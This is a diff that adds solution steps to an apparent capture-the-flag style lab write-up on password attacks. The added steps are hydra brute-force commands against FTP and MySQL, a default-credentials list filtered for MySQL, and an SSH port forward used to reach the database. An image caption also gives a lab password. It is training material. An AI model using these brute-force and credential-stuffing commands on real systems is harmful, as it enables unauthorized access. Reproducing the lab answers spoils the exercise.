@@ -93,7 +93,13 @@ We can also create a wordlist based on potential words from the company's websit
 ElFelixi0@htb[/htb]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
 ```
 
-Create a mutated wordlist using the files in the ZIP file under "Resources" in the top right corner of this section. Use this wordlist to brute force the password for the user "sam". Once successful, log in with SSH and submit the contents of the flag.txt file as your answer.
+_**Create a mutated wordlist using the files in the ZIP file under "Resources" in the top right corner of this section. Use this wordlist to brute force the password for the user "sam". Once successful, log in with SSH and submit the contents of the flag.txt file as your answer.**_
+
+```
+hydra -l sam -P batman.txt ftp://10.129.194.9
+```
+
+<figure><img src="../../../.gitbook/assets/image (1453).png" alt=""><figcaption><p>B@tm@n2022!</p></figcaption></figure>
 
 Here is a list of known default credentials [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet).
 
@@ -106,3 +112,38 @@ hydra -C user_pass.list ssh://10.129.42.197
 
 _**Use the user's credentials we found in the previous section and find out the credentials for MySQL. Submit the credentials as the answer.**_ (Format: :)
 
+I first get the list ->
+
+```
+wget https://raw.githubusercontent.com/ihebski/DefaultCreds-cheat-sheet/main/DefaultCreds-Cheat-Sheet.csv
+```
+
+Then i adapt the content of the list to mysql ->
+
+```
+grep -i 'mysql' DefaultCreds-Cheat-Sheet.csv > cred.list
+```
+
+Then i manually change the list to fit to the template used for password username:password ->
+
+```
+admin@example.com:admin
+root:<blank>
+root:root
+superdba:admin
+scrutremote:admin
+```
+
+then i forward the ssh connection ->
+
+```
+ssh -L 4444:localhost:3306 sam@10.129.194.9
+```
+
+then i open new tab and launch the following with my msql list ->
+
+```
+hydra -C mysqldflt.txt mysql://localhost:4444
+```
+
+<figure><img src="../../../.gitbook/assets/image (1454).png" alt=""><figcaption></figcaption></figure>
